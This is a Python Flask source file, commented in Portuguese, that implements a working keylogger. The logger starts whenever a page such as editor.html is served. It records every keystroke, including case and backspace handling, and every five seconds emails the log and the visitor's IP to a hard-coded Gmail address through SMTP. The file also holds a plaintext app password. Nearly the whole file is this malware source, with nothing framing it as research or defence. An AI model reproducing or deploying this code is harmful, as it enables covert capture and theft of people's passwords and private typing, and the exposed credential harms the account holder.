from flask import Flask, render_template, request, abort
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import re

app = Flask(__name__)

# Configurações
TEMPO_REPORT = 5  # segundos
EMAIL = "gusta22sorvete@gmail.com"
SENHA_APP = "dzsk rkhn kafr qxbr"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

class EnhancedKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.user_ip = ""
        self.active = False
        self.shift_pressed = False
        self.caps_lock = False
    
    def callback(self, event):
        if not self.active:
            return
            
        # Verifica estado das teclas modificadoras
        if event.name == 'shift' or event.name == 'right shift':
            self.shift_pressed = (event.event_type == keyboard.KEY_DOWN)
            return
        elif event.name == 'caps lock' and event.event_type == keyboard.KEY_DOWN:
            self.caps_lock = not self.caps_lock
            return
            
        # Só processa eventos de liberação de tecla
        if event.event_type != keyboard.KEY_UP:
            return
            
        name = event.name
        
        # Tratamento especial para Backspace
        if name == 'backspace':
            if self.log:
                self.log = self.log[:-1]
            return
        
        # Determina se a tecla deve ser maiúscula
        is_upper = self.shift_pressed ^ self.caps_lock if name.isalpha() else False
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "tab":
                name = "\t"
            else:
                # Mantém apenas teclas especiais entre colchetes
                name = f"[{name.upper()}]"
        else:
            # Aplica maiúscula se necessário
            name = name.upper() if is_upper else name.lower()
        
        self.log += name
    
    def send_email(self):
        if not self.log or not self.active:
            return
        
        try:
            # Limpa o log removendo sequências de [SHIFT] ou similares
            clean_log = self.log
            
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.ehlo()
            server.starttls()
            server.login(EMAIL, SENHA_APP)
            
            msg = MIMEMultipart()
            msg['From'] = EMAIL
            msg['To'] = EMAIL
            msg['Subject'] = f"Keylogger Report - {self.start_dt.strftime('%Y-%m-%d %H:%M')}"
            
            body = f"""
            User IP: {self.user_ip}
            Start Time: {self.start_dt.strftime('%Y-%m-%d %H:%M:%S')}
            Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            
            Keystrokes:
            {clean_log}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            server.sendmail(EMAIL, EMAIL, msg.as_string())
            server.quit()
            
            # Mantém contexto reduzido
            self.log = self.log[-500:]  # Mantém mais contexto que antes
            self.start_dt = datetime.now()
            
        except Exception as e:
            print(f"Email error: {e}")
    
    def report(self):
        if self.active:
            self.send_email()
            Timer(self.interval, self.report).start()
    
    def start(self, ip):
        self.user_ip = ip
        if not self.active:
            keyboard.hook(self.callback)
            self.active = True
            self.report()
    
    def stop(self):
        self.active = False
        self.send_email()
        keyboard.unhook_all()

keylogger = EnhancedKeylogger(TEMPO_REPORT)

@app.route('/', defaults={'path': 'editor.html'})
@app.route('/<path:path>')
def catch_all(path):
    # Verifica se o path é um arquivo HTML existente
    if not path.endswith('.html'):
        path += '.html'
    
    template_path = os.path.join(app.template_folder, path)
    
    # Verifica se o template existe e é um arquivo HTML
    if not os.path.isfile(template_path) or not path.endswith('.html'):
        abort(404)
    
    # Inicia/continua o keylogger
    keylogger.start(request.remote_addr)
    
    return render_template(path)

@app.route('/stop_keylogger')
def stop_keylogger():
    keylogger.stop()
    return "Keylogger stopped"

if __name__ == '__main__':
    # Cria a pasta templates se não existir
    os.makedirs(os.path.join(os.path.dirname(__file__), 'templates'), exist_ok=True)
    app.run(debug=True, port=5000)